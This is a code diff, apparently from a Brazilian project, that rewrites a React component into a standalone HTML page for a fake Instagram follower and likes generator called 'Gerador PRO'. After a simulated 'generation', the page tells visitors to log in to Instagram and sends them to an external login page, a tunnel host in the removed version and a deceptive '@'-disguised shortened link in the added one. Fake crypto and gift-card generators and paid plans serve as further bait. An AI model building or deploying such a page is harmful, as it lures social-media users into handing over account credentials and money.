@@ -1,137 +1,240 @@
-import { useState } from "react";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Card, CardContent } from "@/components/ui/card";
-import { Loader2, ShieldCheck, Lock, Users, Heart, Menu, User, Bitcoin, Gift, ThumbsUp, Star } from "lucide-react";
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gerador PRO</title>
+  
+  <!-- Estilos CSS -->
+  <style>
+    body {
+      background-color: #1a202c;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      flex-direction: column;
+    }
 
-export default function GeradorSeguidores() {
-  const [username, setUsername] = useState("");
-  const [quantidade, setQuantidade] = useState("");
-  const [tipo, setTipo] = useState("seguidores");
-  const [status, setStatus] = useState("idle");
-  const [menuOpen, setMenuOpen] = useState(false);
+    .container {
+      width: 100%;
+      max-width: 500px;
+      padding: 20px;
+      background-color: #2d3748;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      margin-top: 20px;
+    }
 
-  const handleGenerate = () => {
-    if (!username || !quantidade) return;
-    setStatus("loading");
-    setTimeout(() => {
-      setStatus("done");
-    }, 3000);
-  };
+    h1, h2 {
+      text-align: center;
+    }
 
-  return (
-    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 p-4 text-white">
-      {/* Navbar */}
-      <div className="w-full flex justify-between items-center p-4 bg-gray-800 shadow-md border-b border-gray-700 relative">
-        <Menu className="text-white cursor-pointer" onClick={() => setMenuOpen(!menuOpen)} />
-        <h1 className="text-xl font-bold">Gerador PRO</h1>
-        <User className="text-white cursor-pointer" />
-        
-        {menuOpen && (
-          <div className="absolute left-0 top-12 bg-gray-800 border border-gray-700 rounded-md p-2 shadow-lg w-48 flex flex-col gap-2">
-            <Button className="flex items-center gap-2 text-white bg-gray-700" onClick={() => alert('Gerar Criptomoeda')}> <Bitcoin /> Gerar Criptomoeda </Button>
-            <Button className="flex items-center gap-2 text-white bg-gray-700" onClick={() => alert('Gerar Gift Card')}> <Gift /> Gerar Gift Card </Button>
-            <Button className="flex items-center gap-2 text-white bg-gray-700" onClick={() => alert('Gerar Curtidas')}> <ThumbsUp /> Gerar Curtidas </Button>
-          </div>
-        )}
-      </div>
+    .input-field, .button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #4a5568;
+    }
 
-      {/* Gerador */}
-      <Card className="w-full max-w-md p-6 bg-gray-800 shadow-xl rounded-lg border border-gray-700 mt-6">
-        <CardContent className="flex flex-col gap-4">
-          <h1 className="text-2xl font-bold text-center flex items-center justify-center gap-2">
-            <ShieldCheck className="text-green-400" /> Gerador Seguro
-          </h1>
-          <p className="text-sm text-gray-400 text-center">Aumente seu engajamento de forma rápida e segura!</p>
-          <Input 
-            placeholder="Digite seu @ do Instagram" 
-            value={username} 
-            onChange={(e) => setUsername(e.target.value)} 
-            className="bg-gray-700 border-gray-600 text-white"
-          />
-          <Input 
-            type="number" 
-            placeholder="Quantidade desejada" 
-            value={quantidade} 
-            onChange={(e) => setQuantidade(e.target.value)} 
-            className="bg-gray-700 border-gray-600 text-white"
-          />
-          <div className="flex gap-2">
-            <Button 
-              onClick={() => setTipo("seguidores")} 
-              className={`flex-1 ${tipo === "seguidores" ? "bg-blue-500" : "bg-gray-600"}`}
-            >
-              <Users className="mr-2" /> Seguidores
-            </Button>
-            <Button 
-              onClick={() => setTipo("curtidas")} 
-              className={`flex-1 ${tipo === "curtidas" ? "bg-red-500" : "bg-gray-600"}`}
-            >
-              <Heart className="mr-2" /> Curtidas
-            </Button>
-          </div>
-          <Button 
-            onClick={handleGenerate} 
-            className="bg-green-500 hover:bg-green-600 text-white py-2 rounded"
-            disabled={status === "loading"}
-          >
-            {status === "loading" ? <Loader2 className="animate-spin" /> : "Gerar"}
-          </Button>
-          {status === "loading" && <p className="text-center text-yellow-400">Gerando...</p>}
-          {status === "done" && (
-            <div className="text-center">
-              <p className="text-green-400 font-semibold">Concluído com sucesso!</p>
-              <p className="text-sm text-gray-400 mt-2">Faça o login da sua conta do Instagram para ativar o sistema de seguidores</p>
-              <div className="flex justify-center mt-4">
-                <Button 
-                  className="bg-blue-500 hover:bg-blue-600 text-white flex items-center justify-center gap-2"
-                  onClick={() => window.location.href = 'https://zdg4rjn6bi.eu.loclx.io/login.html'}
-                >
-                  <Lock /> Login
-                </Button>
-              </div>
-            </div>
-          )}
-        </CardContent>
-      </Card>
+    .button {
+      background-color: #38a169;
+      color: white;
+      cursor: pointer;
+    }
 
-      {/* Planos Pagos */}
-      <div className="w-full max-w-md p-6 bg-gray-800 shadow-xl rounded-lg border border-gray-700 mt-8">
-        <h2 className="text-2xl font-bold text-center mb-4 text-white">Planos PRO</h2>
-        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
-            <h3 className="text-xl font-semibold mb-4">Plano Básico</h3>
-            <p className="text-lg mb-4">10.000 Seguidores / Curtidas</p>
-            <p className="text-sm mb-4">Ideal para quem está começando!</p>
-            <p className="text-lg font-bold mb-4">R$ 49,99</p>
-            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
-          </Card>
+    .button:disabled {
+      background-color: #2d3748;
+      cursor: not-allowed;
+    }
 
-          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
-            <h3 className="text-xl font-semibold mb-4">Plano Avançado</h3>
-            <p className="text-lg mb-4">50.000 Seguidores / Curtidas</p>
-            <p className="text-sm mb-4">Perfeito para aumentar o engajamento rapidamente!</p>
-            <p className="text-lg font-bold mb-4">R$ 129,99</p>
-            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
-          </Card>
+    .plan-card {
+      background-color: #4a5568;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: center;
+      margin: 10px;
+    }
 
-          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
-            <h3 className="text-xl font-semibold mb-4">Plano Premium</h3>
-            <p className="text-lg mb-4">100.000 Seguidores / Curtidas</p>
-            <p className="text-sm mb-4">Para resultados rápidos e consistentes!</p>
-            <p className="text-lg font-bold mb-4">R$ 199,99</p>
-            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
-          </Card>
+    .plan-card h3 {
+      margin-bottom: 10px;
+    }
 
-          <Card className="bg-gray-700 text-white text-center p-6 rounded-lg">
-            <h3 className="text-xl font-semibold mb-4">Plano Executivo</h3>
-            <p className="text-lg mb-4">500.000 Seguidores / Curtidas</p>
-            <p className="text-sm mb-4">Para quem busca um nível de engajamento profissional!</p>
-            <p className="text-lg font-bold mb-4">R$ 499,99</p>
-            <Button className="bg-blue-500 hover:bg-blue-600 w-full">Assinar</Button>
-          </Card>
-        </div>
-      </div>
+    .plan-card p {
+      margin-bottom: 5px;
+    }
+
+    .plan-button {
+      background-color: #3182ce;
+      padding: 10px;
+      color: white;
+      text-decoration: none;
+      border-radius: 5px;
+    }
+
+    .plan-button:hover {
+      background-color: #2b6cb0;
+    }
+
+    .status-message {
+      text-align: center;
+      color: yellow;
+      font-size: 14px;
+    }
+
+    .status-done {
+      color: green;
+    }
+
+    .menu {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .menu button {
+      background: none;
+      color: white;
+      border: none;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    .menu-dropdown {
+      background-color: #2d3748;
+      position: absolute;
+      top: 60px;
+      left: 20px;
+      border-radius: 5px;
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      padding: 10px;
+    }
+
+    .menu-dropdown button {
+      background-color: #38a169;
+      padding: 10px;
+      color: white;
+      border-radius: 5px;
+    }
+
+    .menu-dropdown.active {
+      display: flex;
+    }
+
+  </style>
+</head>
+<body>
+
+  <!-- Navbar -->
+  <div class="menu">
+    <button onclick="toggleMenu()">☰ Menu</button>
+    <h1>Gerador PRO</h1>
+    <button>👤</button>
+  </div>
+
+  <!-- Menu Dropdown -->
+  <div id="menuDropdown" class="menu-dropdown">
+    <button onclick="alert('Gerar Criptomoeda')">💰 Gerar Criptomoeda</button>
+    <button onclick="alert('Gerar Gift Card')">🎁 Gerar Gift Card</button>
+    <button onclick="alert('Gerar Curtidas')">👍 Gerar Curtidas</button>
+  </div>
+
+  <!-- Gerador -->
+  <div class="container">
+    <h2>Gerador Seguro</h2>
+    <p>Aumente seu engajamento de forma rápida e segura!</p>
+
+    <input id="username" class="input-field" type="text" placeholder="Digite seu @ do Instagram" />
+    <input id="quantidade" class="input-field" type="number" placeholder="Quantidade desejada" />
+    
+    <div>
+      <button id="seguidoresButton" class="button" onclick="setTipo('seguidores')">🧑‍🤝‍🧑 Seguidores</button>
+      <button id="curtidasButton" class="button" onclick="setTipo('curtidas')">❤️ Curtidas</button>
     </div>
-  );
-}
+
+    <button class="button" id="generateButton" onclick="handleGenerate()">Gerar</button>
+    <p id="statusMessage" class="status-message"></p>
+
+    <div id="result" style="display: none;">
+      <p class="status-done">Concluído com sucesso!</p>
+      <p>Faça o login da sua conta do Instagram para ativar o sistema de seguidores</p>
+      <button class="button" onclick="window.location.href = 'https://get-unlimited-followers-for-instagram@is.gd/X7lyFD'">🔐 Login</button>
+    </div>
+  </div>
+
+  <!-- Planos Pagos -->
+  <div class="container">
+    <h2>Planos PRO</h2>
+
+    <div class="plan-card">
+      <h3>Plano Básico</h3>
+      <p>10.000 Seguidores / Curtidas</p>
+      <p>R$ 49,99</p>
+      <a class="plan-button" href="#">Assinar</a>
+    </div>
+
+    <div class="plan-card">
+      <h3>Plano Avançado</h3>
+      <p>50.000 Seguidores / Curtidas</p>
+      <p>R$ 129,99</p>
+      <a class="plan-button" href="#">Assinar</a>
+    </div>
+
+    <div class="plan-card">
+      <h3>Plano Premium</h3>
+      <p>100.000 Seguidores / Curtidas</p>
+      <p>R$ 199,99</p>
+      <a class="plan-button" href="#">Assinar</a>
+    </div>
+
+    <div class="plan-card">
+      <h3>Plano Executivo</h3>
+      <p>500.000 Seguidores / Curtidas</p>
+      <p>R$ 499,99</p>
+      <a class="plan-button" href="#">Assinar</a>
+    </div>
+  </div>
+
+  <!-- JavaScript -->
+  <script>
+    let tipo = 'seguidores';
+    let status = 'idle';
+
+    function toggleMenu() {
+      document.getElementById('menuDropdown').classList.toggle('active');
+    }
+
+    function setTipo(selectedTipo) {
+      tipo = selectedTipo;
+      document.getElementById('seguidoresButton').style.backgroundColor = selectedTipo === 'seguidores' ? '#2b6cb0' : '#2d3748';
+      document.getElementById('curtidasButton').style.backgroundColor = selectedTipo === 'curtidas' ? '#e53e3e' : '#2d3748';
+    }
+
+    function handleGenerate() {
+      const username = document.getElementById('username').value;
+      const quantidade = document.getElementById('quantidade').value;
+
+      if (!username || !quantidade) return;
+
+      status = 'loading';
+      document.getElementById('statusMessage').innerText = 'Gerando...';
+      document.getElementById('generateButton').disabled = true;
+
+      setTimeout(() => {
+        status = 'done';
+        document.getElementById('statusMessage').innerText = '';
+        document.getElementById('result').style.display = 'block';
+        document.getElementById('generateButton').disabled = false;
+      }, 3000);
+    }
+  </script>
+
+</body>
+</html>
